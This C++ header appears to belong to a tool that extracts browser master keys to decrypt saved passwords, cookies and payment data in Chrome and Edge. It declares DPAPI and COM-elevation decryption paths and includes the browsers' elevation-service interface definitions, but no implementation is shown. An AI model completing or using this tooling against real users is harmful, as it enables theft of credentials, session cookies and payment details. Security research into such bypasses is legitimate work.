// BrowserCrypto.h - Cryptographic operations and browser-specific configurations
// Implements selective decryption strategy for different data types and browsers

#ifndef BROWSER_CRYPTO_H
#define BROWSER_CRYPTO_H

#include <Windows.h>
#include <vector>
#include <string>
#include <filesystem>
#include <unordered_map>

namespace fs = std::filesystem;

namespace SecurityComponents
{
    class PipeLogger;

    // Data type enumeration for selective decryption strategy
    enum class DataType {
        Passwords,    // Use DPAPI for Edge passwords (no process required)
        Cookies,      // Use COM elevation for browser cookies
        Payments,     // Use COM elevation for payment information  
        All           // Default behavior - use appropriate method per browser
    };

    // Browser-specific configuration and COM interface definitions
    namespace Browser
    {
        struct Config
        {
            std::string name;
            std::wstring processName;
            CLSID clsid;
            IID iid;
            fs::path userDataSubPath;
        };
        
        const std::unordered_map<std::string, Config>& GetConfigs();
        Config GetConfigForCurrentProcess();
    }

    // Cryptographic operations for AES-GCM decryption and key management
    namespace Crypto
    {
        constexpr size_t KEY_SIZE = 32;
        constexpr size_t GCM_IV_LENGTH = 12;
        constexpr size_t GCM_TAG_LENGTH = 16;

        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& blob);
        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path& localStatePath);
    }

    class BrowserManager
    {
    public:
        BrowserManager();
        const Browser::Config& getConfig() const noexcept { return m_config; }
        fs::path getUserDataRoot() const;

    private:
        Browser::Config m_config;
    };

    // Master key decryptor with selective strategy per data type
    class MasterKeyDecryptor
    {
    public:
        explicit MasterKeyDecryptor(PipeLogger& logger);
        ~MasterKeyDecryptor();
        
        // Main decryption interface - intelligently chooses COM or DPAPI
        std::vector<uint8_t> Decrypt(const Browser::Config& config, const fs::path& localStatePath, DataType dataType = DataType::All);

    private:
        PipeLogger& m_logger;
        bool m_comInitialized = false;
        
        std::vector<uint8_t> DecryptWithCOM(const Browser::Config& config, const std::vector<uint8_t>& encryptedKeyBlob);
        std::vector<uint8_t> DecryptWithDPAPI(const fs::path& localStatePath);
    };
}

// COM interface definitions
enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator {};

#endif // BROWSER_CRYPTO_H